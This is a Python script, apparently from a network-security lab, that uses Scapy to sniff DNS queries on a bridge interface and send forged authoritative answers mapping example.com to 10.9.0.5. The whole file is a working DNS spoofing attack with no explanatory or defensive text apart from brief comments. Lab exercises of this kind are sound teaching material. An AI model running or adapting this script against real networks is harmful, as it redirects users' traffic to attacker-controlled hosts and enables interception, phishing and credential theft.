#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        # The IP adress of the local DNS server that I want to spoof
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)  # Create an IP object
        udp = UDP(dport=pkt[UDP].sport, sport=53)  # Create a UDP object
        Anssec = DNSRR(rrname=NS_NAME, type='A', rdata='10.9.0.5', ttl=259200)  # Create an answer record
        dns = DNS(
            id=pkt[DNS].id,
            qr=1,
            aa=1,
            rd=pkt[DNS].rd,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=pkt[DNS].qd,
            an=Anssec
         ) # Create a DNS object
        spoofpkt = ip / udp / dns  # Assemble the spoofed DNS packet
        send(spoofpkt)

myFilter = "udp port 53"  # Set the filter
pkt = sniff(iface='br-f0294016680f', filter=myFilter, prn=spoof_dns)
